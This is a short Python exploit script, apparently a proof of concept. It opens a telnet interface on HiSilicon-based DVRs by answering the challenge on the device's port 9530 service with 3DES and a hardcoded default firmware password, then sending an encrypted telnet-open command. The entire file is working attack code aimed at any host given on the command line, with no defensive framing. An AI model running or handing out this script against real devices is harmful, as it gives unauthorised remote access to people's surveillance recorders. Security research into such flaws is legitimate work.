#!/usr/bin/env python3
#
# open telnet (:23) on HiSilicon DVR using service on :9530
#

# modified pyDes: https://github.com/tothi/pyDes
from pyDes import *
from pwn import *
import argparse

PASSWORD = "2wj9fsa2"  # hardcoded default in dvrbox binary
PORT = 9530

def hex_print(s):
    return ':'.join(['{:02X}'.format(c) for c in s])

class DvrHelper(remote):
    def _send_str(self, s):
        self.send(bytes([len(s)]) + s)
        
    def open_telnet(self, password):
        log.info("sending OpenTelnet:OpenOnce...")
        self._send_str(b"OpenTelnet:OpenOnce")

        self.recvuntil("randNum:")
        challenge = self.recv(8).decode()
        log.info("received challenge randNum:{}".format(challenge))

        log.info("using password {}".format(password))
        key = challenge + password
        log.info("initializing (modified) 3des with key {}".format(key))
        k = triple_des(key, ECB, padmode=PAD_PKCS5, hs=True)
        enc_chal = k.encrypt(challenge)
        log.info("sending encrypted challenge {}".format(hex_print(enc_chal)))
        self._send_str(b"randNum:" + enc_chal)
        self.recvuntil("verify:")
        assert self.recv(2) == b"OK"
        log.success("verify:OK")

        log.info("sending encrypted command Telnet:OpenOnce...")
        self._send_str(b"CMD:" + k.encrypt("Telnet:OpenOnce"))
        self.recvuntil("Open:")
        assert self.recv(2) == b"OK"
        log.success("Open:OK")
        log.info("open telnet @ {}:{} !!!".format(self.rhost, 23))
        
if __name__ == '__main__':
    p = argparse.ArgumentParser(description="open telnet interface on modern HiSilicon DVR")
    p.add_argument("host", type=str, help="target hostname or IP address")
    p.add_argument("password", type=str, nargs="?", default=PASSWORD, help="8-char password in firmare")
    args = p.parse_args()
            
    dvrHelper = DvrHelper(args.host, PORT)
    dvrHelper.open_telnet(args.password)
